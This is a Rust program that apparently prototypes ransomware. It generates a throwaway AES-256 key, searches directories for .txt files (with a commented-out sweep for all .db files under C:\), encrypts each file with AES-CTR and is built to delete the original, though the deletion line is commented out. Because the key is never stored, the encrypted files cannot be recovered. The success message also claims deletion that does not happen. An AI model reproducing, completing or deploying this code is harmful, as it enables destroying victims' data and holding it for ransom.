use aes::Aes256;
use cipher::{KeyInit, KeyIvInit, StreamCipher, StreamCipherSeek};
use ctr::Ctr128BE;
use rand::{thread_rng, Rng};
use std::{
    fs::{self, File},
    io::{self, Read, Write},
    panic::panic_any,
};
use walkdir::WalkDir;

// Type alias for AES-256 in CTR mode
type Aes256Ctr = Ctr128BE<Aes256>;

fn main() {
    initiailize_process();
    let key: [u8; 32] = thread_rng().gen();

    //let paths = search_db_files("C:\\");
    let paths = search_txt_files("/home/sighgone/projects/sudle/test_files");
    for file_path in paths {
        let output_file_path = format!("{}_encrypted", file_path);
        match encrypt_delete(&file_path, &output_file_path, &key) {
            Ok(_) => println!(
                "{} encrypted and original file deleted successfully",
                file_path
            ),
            Err(e) => println!("Error processing {}: {}", file_path, e),
        }
    }
}

fn initiailize_process() {
    // Add your code here
}

fn search_db_files(start_path: &str) -> Vec<String> {
    let mut paths = vec![];
    for entry in WalkDir::new(start_path)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.path().extension().map_or(false, |ext| ext == "db"))
    {
        if let Some(path) = entry.path().to_str() {
            paths.push(path.to_string());
        }
    }
    paths
}

fn search_txt_files(start_path: &str) -> Vec<String> {
    let mut paths = vec![];
    for entry in WalkDir::new(start_path)
        .max_depth(1)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| e.path().extension().map_or(false, |ext| ext == "txt"))
    {
        paths.push(entry.path().to_str().unwrap().to_string());
    }
    paths
}

fn encrypt_delete(input_file_path: &str, output_file_path: &str, key: &[u8; 32]) -> io::Result<()> {
    // Open the input file and read its contents
    let mut input_file = File::open(input_file_path)?;
    let mut contents = Vec::new();
    input_file.read_to_end(&mut contents)?;

    // Generate a random nonce for CTR mode
    let mut nonce = [0u8; 16];
    thread_rng().fill(&mut nonce);

    // Create the cipher instance
    let cipher = Aes256Ctr::new_from_slices(key, &nonce).unwrap();

    // Encrypt the contents in place
    let mut buffer = contents.clone();
    cipher.clone().apply_keystream(&mut buffer);

    // Open the output file and write the nonce followed by the encrypted contents
    let mut output_file = File::create(output_file_path)?;
    output_file.write_all(&nonce)?;
    output_file.write_all(&buffer)?;
    //fs::remove_file(input_file_path)?;

    Ok(())
}
